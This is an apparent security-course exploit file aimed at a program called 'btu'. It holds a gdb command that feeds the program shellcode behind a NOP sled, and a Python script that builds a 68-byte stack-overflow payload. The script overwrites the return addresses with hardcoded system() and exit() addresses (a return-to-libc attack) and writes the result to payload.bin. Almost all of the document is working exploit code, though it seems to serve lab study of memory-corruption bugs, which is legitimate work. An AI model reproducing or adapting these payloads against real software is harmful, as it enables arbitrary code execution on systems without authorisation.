'''
gdb --args ./build/bin/btu remove 1024 $(echo -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\xb0\x01\x31\xdb\xb3\x05\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xbb\xb0\x04\x08\xbb\xbb\xbb\xbb\xe0\x0d\x05\x08\x50\x7d\x05\x08")
'''

#!/usr/bin/python3 

# x/100s *((char **)environ) this is the command we use inside gdb to get the address of 'bin/bash
import sys 


# Fill content with non-zero values 
content = bytearray(0x90 for i in range(68)) 


# got_base = 0x08050bf4
# base_ptr_adrr = 0xffffc5cc
# system_addr = 0x0804b01f
exit_addr = 0xf7b55460 # The address of exit () 
system_addr = 0x0804b00c # we need to 
btu_obj = 0x8050d20
student_addr = 1782914303

# content[44:48] = got_baStr_adrr.to_bytes(4, "little")
content[52:56] = system_addr.to_bytes(4, "little")
content[56:60] = exit_addr.to_bytes(4, "little")
content[60:64] = btu_obj.to_bytes(4, "little")
content[64:68] = student_addr.to_bytes(4, "little")

# Print the final payload in escaped format for gdb --args
escaped = ''.join('\\x{:02x}'.format(b) for b in content)

with open("payload.bin", "wb") as f:
    f.write(content)

print('gdb --args ./build/bin/btu remove 1782914303 "$(cat payload.bin)"')

# print(f'gdb --args ./build/bin/btu remove 1782914303 $(echo -e "{escaped}")')

# print(
#     "gdb --args ./build/bin/btu remove 1782914303 "
#     '"$(python3 -c "import sys; sys.stdout.buffer.write('
#     + repr(bytes(content)) +
#     ')")"'
# )